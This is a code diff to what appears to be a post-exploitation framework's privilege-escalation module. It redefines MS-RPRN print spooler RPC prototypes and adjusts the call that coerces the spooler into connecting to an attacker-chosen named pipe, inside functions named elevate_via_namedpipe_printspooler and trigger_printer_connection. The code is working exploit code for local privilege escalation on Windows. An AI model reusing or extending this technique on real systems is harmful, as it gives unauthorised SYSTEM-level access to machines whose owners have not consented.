@@ -1,12 +1,22 @@
 #include "precomp.h"
 #include "common_metapi.h"
 #include "namedpipe.h"
-#include "ms-rprn_h.h"
+
+typedef void* PRINTER_HANDLE;
+typedef wchar_t* STRING_HANDLE;
+
+typedef struct _DEVMODE_CONTAINER {
+	DWORD cbBuf;
+	BYTE* pDevMode;
+} DEVMODE_CONTAINER;
+
+DWORD RpcOpenPrinter(STRING_HANDLE pPrinterName, PRINTER_HANDLE* pHandle, wchar_t* pDatatype, DEVMODE_CONTAINER* pDevModeContainer, DWORD AccessRequired);
+DWORD RpcClosePrinter(PRINTER_HANDLE* phPrinter);
+DWORD RpcRemoteFindFirstPrinterChangeNotification(PRINTER_HANDLE hPrinter, DWORD fdwFlags, DWORD fdwOptions, wchar_t* pszLocalMachine, DWORD dwPrinterLocal, DWORD cbBuffer, BYTE* pBuffer);
 
 typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
 DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName);
-
 
 DWORD elevate_via_namedpipe_printspooler(Remote* remote, Packet* packet)
 {
@@ -148,7 +158,7 @@ DWORD WINAPI trigger_printer_connection(LPWSTR pPipeName)
 		{
 			if (RpcOpenPrinter(pPrinterName, &hPrinter, NULL, &devModeContainer, 0) == RPC_S_OK)
 			{
-				RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pCaptureServer, 0, NULL);
+				RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pCaptureServer, 0, 0, NULL);
 				RpcClosePrinter(&hPrinter);
 			}
 		}
